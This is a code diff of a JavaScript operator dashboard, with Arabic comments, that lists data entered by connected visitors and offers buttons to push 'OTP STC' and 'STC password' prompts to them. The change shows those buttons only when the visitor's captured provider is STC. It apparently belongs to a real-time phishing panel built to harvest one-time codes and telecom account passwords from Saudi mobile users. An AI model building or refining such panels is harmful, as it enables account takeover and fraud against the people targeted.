@@ -1663,11 +1663,18 @@
             
             // إضافة أزرار لتوثيق رقم الجوال
             if (dataEntry.page === 'توثيق رقم الجوال') {
+              // الحصول على مزود الخدمة من البيانات
+              const provider = dataEntry.content['مزود الخدمة'] || dataEntry.content['الشبكة'] || visitor.network || '';
+              const isStc = provider.toLowerCase().includes('stc') || provider === 'STC' || provider === 'stc';
+              
               const otpBtnId = 'otp-btn-' + visitor.socketId + '-' + dataIndex;
               const stcPassBtnId = 'stc-pass-btn-' + visitor.socketId + '-' + dataIndex;
-              html += '<div class="flex gap-2 mt-3">';
-              html += '<button id="' + otpBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP STC</button>';
-              html += '<button id="' + stcPassBtnId + '" class="flex-1 px-3 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>كلمة مرور STC</button>';
+              
+              // إظهار أزرار STC فقط إذا كان المزود STC
+              if (isStc) {
+                html += '<div class="flex gap-2 mt-3">';
+                html += '<button id="' + otpBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP STC</button>';
+                html += '<button id="' + stcPassBtnId + '" class="flex-1 px-3 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>كلمة مرور STC</button>';
               html += '</div>';
               setTimeout(() => {
                 const otpBtn = document.getElementById(otpBtnId);
@@ -1703,6 +1710,7 @@
                   });
                 }
               }, 100);
+              } // إغلاق شرط isStc
             }
             
             // إضافة أزرار لكلمة مرور STC
